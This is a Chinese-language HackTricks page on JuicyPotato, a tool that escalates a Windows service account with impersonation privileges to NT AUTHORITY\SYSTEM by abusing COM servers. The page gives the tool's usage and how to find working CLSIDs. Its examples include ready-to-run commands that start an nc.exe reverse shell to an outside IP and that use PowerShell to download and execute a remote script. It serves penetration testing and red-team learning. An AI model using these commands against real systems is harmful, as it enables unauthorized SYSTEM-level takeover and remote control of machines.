# JuicyPotato

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中宣传**吗？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFT收藏品](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

{% hint style="warning" %}
**JuicyPotato在Windows Server 2019和Windows 10版本1809及更高版本上无法运行**。但是，可以使用[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)来利用相同的特权并获得`NT AUTHORITY\SYSTEM`级别访问。_**查看：**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato（滥用黄金特权） <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_一个经过改进的_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_，带有一点果汁，即**另一个本地权限提升工具，从Windows服务账户提升到NT AUTHORITY\SYSTEM**_

#### 您可以从[https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)下载JuicyPotato

### 摘要 <a href="#summary" id="summary"></a>

**[从JuicyPotato自述文件中了解](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)及其[变体](https://github.com/decoder-it/lonelypotato)利用基于[`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx)的特权升级链[服务](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)在`127.0.0.1:6666`上具有MiTM监听器，当您拥有`SeImpersonate`或`SeAssignPrimaryToken`特权时。在Windows构建审查期间，我们发现了一个设置，其中`BITS`被故意禁用，端口`6666`被占用。

我们决定武装化[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)：**欢迎Juicy Potato**。

> 欲了解理论，请参阅[Rotten Potato - 从服务账户提升到SYSTEM的特权提升](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)，并跟随链接和参考链。

我们发现，除了`BITS`外，还有一些COM服务器可以被滥用。它们只需要：

1. 能够由当前用户实例化，通常是具有模拟特权的“服务用户”
2. 实现`IMarshal`接口
3. 作为提升用户（SYSTEM、管理员等）运行

经过一些测试，我们获得并测试了在几个Windows版本上的广泛列表的[有趣CLSID](http://ohpe.it/juicy-potato/CLSID/)。

### 详细信息 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato允许您：

* **目标CLSID** _选择任何您想要的CLSID。_ [_这里_](http://ohpe.it/juicy-potato/CLSID/) _您可以找到按操作系统组织的列表。_
* **COM监听端口** _定义您喜欢的COM监听端口（而不是硬编码的6666）_
* **COM监听IP地址** _将服务器绑定到任何IP_
* **进程创建模式** _根据模拟用户的特权，您可以选择：_
* `CreateProcessWithToken`（需要`SeImpersonate`）
* `CreateProcessAsUser`（需要`SeAssignPrimaryToken`）
* `两者`
* **要启动的进程** _如果利用成功，启动可执行文件或脚本_
* **进程参数** _自定义启动进程参数_
* **RPC服务器地址** _用于隐蔽操作，您可以对外部RPC服务器进行身份验证_
* **RPC服务器端口** _如果您想要对外部服务器进行身份验证且防火墙阻止端口`135`，这将很有用…_
* **测试模式** _主要用于测试目的，即测试CLSID。它创建DCOM并打印令牌的用户。查看_ [_这里进行测试_](http://ohpe.it/juicy-potato/Test/)

### 用法 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 总结 <a href="#final-thoughts" id="final-thoughts"></a>

**[来自 juicy-potato 说明文档](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

如果用户具有 `SeImpersonate` 或 `SeAssignPrimaryToken` 特权，则您将成为 **SYSTEM**。

几乎不可能阻止所有这些 COM 服务器的滥用。您可以考虑通过 `DCOMCNFG` 修改这些对象的权限，但祝您好运，这将是具有挑战性的。

实际解决方案是保护在 `* SERVICE` 帐户下运行的敏感帐户和应用程序。停止 `DCOM` 肯定会阻止此漏洞利用，但可能会对底层操作系统产生严重影响。

来源: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 示例

注意: 访问 [此页面](https://ohpe.it/juicy-potato/CLSID/) 查看要尝试的 CLSID 列表。

### 获取 nc.exe 反向 shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell 反向 shell
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 启动新的CMD（如果您有RDP访问权限）

![](<../../.gitbook/assets/image (37).png>)

## CLSID 问题

通常情况下，JuicyPotato使用的默认CLSID**无法正常工作**，导致利用失败。通常需要多次尝试才能找到一个**有效的CLSID**。要获取针对特定操作系统尝试的CLSID列表，您应该访问此页面：

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **检查CLSID**

首先，您需要一些除了juicypotato.exe之外的可执行文件。

下载[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)并将其加载到您的PS会话中，然后下载并执行[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)。该脚本将创建一个要测试的可能CLSID列表。

然后下载[test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(更改路径到CLSID列表和juicypotato可执行文件)并执行它。它将开始尝试每个CLSID，**当端口号更改时，表示CLSID有效**。

**使用参数 -c 检查**有效的CLSID。

## 参考资料
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要在**HackTricks中宣传您的公司**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向**hacktricks repo**和**hacktricks-cloud repo**提交PR来**分享您的黑客技巧**。

</details>
